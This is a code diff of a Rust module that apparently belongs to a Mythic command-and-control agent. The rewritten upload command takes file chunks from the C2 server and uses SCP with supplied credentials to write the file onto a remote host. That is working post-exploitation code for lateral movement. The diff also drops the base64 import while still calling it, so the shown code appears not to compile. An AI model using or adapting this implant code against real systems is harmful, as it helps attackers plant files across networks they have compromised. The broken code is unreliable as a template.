@@ -1,108 +1,113 @@
+use super::ssh_authenticate;
 use crate::agent::{AgentTask, ContinuedData};
-use crate::mythic_success;
-use crate::utils::unverbatim;
-use base64::{Engine as _, engine::general_purpose};
-use serde::Deserialize;
+use crate::{mythic_continued, mythic_success};
 use serde_json::json;
 use std::error::Error;
-use std::io::prelude::*;
+use std::io::Write;
 use std::path::Path;
 use std::result::Result;
 use std::sync::mpsc;
 
-use path_clean::PathClean;
-
-/// Chunk size used for file transfer (5KB)
+/// Chunk size used for file transfer
 const CHUNK_SIZE: usize = 512000;
 
-/// Struct holding the task parameters
-#[derive(Deserialize)]
-struct UploadArgs {
-    file: String,
-    path: String,
-}
-
-/// Upload a file from the host machine to Mythic
-/// * `tx` - Channel for sending information to Mythic
-/// * `rx` - Channel for receiving information from Mythic
+/// Upload a file to a remote machine using SSH
+/// * `task_id` - Id of the task
+/// * `args` - Mythic arguments of the task
+/// * `tx` - Channel for sending messages to Mythic
+/// * `rx` - Channel for receiving messages from Mythic
 pub fn upload_file(
+    task_id: &str,
+    args: &super::SshArgs,
     tx: &mpsc::Sender<serde_json::Value>,
     rx: mpsc::Receiver<serde_json::Value>,
 ) -> Result<(), Box<dyn Error>> {
-    // Parse the initial tasking information
-    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    let args: UploadArgs = serde_json::from_str(&task.parameters)?;
+    // Get the file id for upload
+    let file_id = args.upload.as_ref().unwrap();
 
-    // Formulate the absolute path for the file upload
-    let cwd = std::env::current_dir()?;
-    let file_path = cwd.join(args.path);
+    // Get the path to the file to upload
+    let upload_path = args.upload_path.as_ref().unwrap();
 
-    // Get the full path as a string
-    let file_path_str = unverbatim(file_path.clean()).to_string_lossy().to_string();
-
-    // Check if the file path being uploaded to already exists
-    let file_path = Path::new(&file_path);
-    if file_path.exists() {
-        return Err("Remote path already exists.".into());
-    }
-
-    // Send up the upload message to Mythic and initiate the upload
+    // Send the initial upload information to Mythic
     tx.send(json!({
         "upload": json!({
             "chunk_size": CHUNK_SIZE,
-            "file_id": args.file,
+            "file_id": file_id,
             "chunk_num": 1,
-            "full_path": file_path_str,
         }),
-        "task_id": task.id,
-        "user_output": "Uploading chunk 1\n",
+        "task_id": task_id,
     }))?;
 
-    // Grab and parse the response from Mythic
+    // Grab the new task arguments from Mythic
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
     let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
 
-    // Store the upload file chunk data
-    let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(
-        continued_args
-            .chunk_data
-            .ok_or_else(|| std::io::Error::other("Failed to get file chunk data"))?,
-    )?;
+    // Base64 decode the initial file chunk
+    let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?;
 
-    // Get the total chunks
-    let total_chunks = continued_args.total_chunks.unwrap();
-
-    // Continue receiving file chunks
-    for chunk_num in 2..=total_chunks {
+    // Keep on downloading and decoding the file
+    for chunk_num in 2..=continued_args.total_chunks.unwrap() {
         tx.send(json!({
             "upload": json!({
                 "chunk_size": CHUNK_SIZE,
-                "file_id": args.file,
+                "file_id": file_id,
                 "chunk_num": chunk_num,
-                "full_path": file_path_str,
             }),
             "task_id": task.id,
-            "user_output": format!("Uploading chunk {}/{}\n", chunk_num, total_chunks),
         }))?;
 
         let task: AgentTask = serde_json::from_value(rx.recv()?)?;
         let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
 
-        // Append the new base64 decoded chunk data
         file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
     }
 
-    // Open the file handle. This will check if the agent has the correct permissions.
-    let mut f = std::fs::File::create(&file_path_str)?;
-
-    // Write out the received file to disk
-    f.write_all(&file_data)?;
-
-    // Send up a success to Mythic
-    tx.send(mythic_success!(
+    // Notify Mythic that the agent received the file
+    tx.send(mythic_continued!(
         task.id,
-        format!("Uploaded '{}' to host", file_path_str)
+        "received",
+        "Agent received file"
     ))?;
+
+    let sess = ssh_authenticate(args)?;
+
+    // Send over the downloaded file using scp
+    let mut sender = sess.scp_send(
+        Path::new(&upload_path),
+        args.mode.unwrap(),
+        file_data.len() as u64,
+        None,
+    )?;
+    sender.write_all(&file_data)?;
+
+    // Close the channel
+    sender.send_eof()?;
+    sender.wait_eof()?;
+    sender.close()?;
+    sender.wait_close()?;
+
+    let mut output = mythic_success!(
+        task.id,
+        format!(
+            "Uploaded file to {}@{}:{}",
+            args.credentials.account, args.host, upload_path
+        )
+    );
+    let output = output.as_object_mut().unwrap();
+    output.insert(
+        "artifacts".to_string(),
+        serde_json::json!(
+            [
+                {
+                    "base_artifact": "Remote FileWrite",
+                    "artifact": format!("ssh {}@{} -upload {}", args.credentials.account, args.host, upload_path)
+                }
+            ]
+        )
+    );
+
+    // Notify Mythic that the file was uploaded
+    tx.send(serde_json::to_value(output)?)?;
 
     Ok(())
 }
